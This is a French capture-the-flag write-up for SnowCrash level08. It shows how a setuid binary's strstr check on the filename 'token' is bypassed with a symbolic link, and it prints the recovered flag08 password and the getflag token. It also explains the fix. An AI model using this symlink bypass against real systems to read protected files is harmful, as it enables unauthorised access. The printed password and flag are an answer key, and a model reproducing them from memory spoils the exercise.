# SnowCrash - level08 writeup

## Objectif

Contourner la restriction d’accès du binaire level08 afin de lire le fichier token, puis utiliser ce mot de passe pour obtenir le flag.

## Recon

Exécution sans argument :

```
./level08
```

Le programme attend un fichier à lire.

Tentative directe :

```
./level08 token
```

Refus d’accès :

```
You may not access 'token'
```

Analyse avec ltrace :

```
ltrace ./level08 token
```

Sortie clé :

```
strstr("token", "token") = "token"
```

Le programme interdit simplement tout chemin contenant la sous-chaîne token.

## Analyse

Le contrôle est effectué sur le nom du chemin, pas sur l’inode ou la cible réelle.

En utilisant un lien symbolique vers token avec un nom différent, on contourne ce filtre naïf.

## Exploitation

Création d’un lien symbolique vers token avec un nom autorisé :

```
ln -s token asd
```

Lecture via le binaire :

```
./level08 asd
quif5eloekouj29ke0vouxean
```

Connexion au compte flag08 et récupération du flag :

```
su flag08
Password: quif5eloekouj29ke0vouxean
getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

## Résultat

- Technique - > Bypass de filtre par lien symbolique
- Password flag08 - > quif5eloekouj29ke0vouxean
- Token getflag - > 25749xKZ8L7DkSCwJkT9dyv6f

## Notes

- Vulnérabilité : validation basée uniquement sur le nom de fichier (strstr)
- Correction : vérifier les permissions réelles (open + fstat) et éviter les filtres par chaîne
- Les symlinks permettent de contourner de nombreux contrôles naïfs
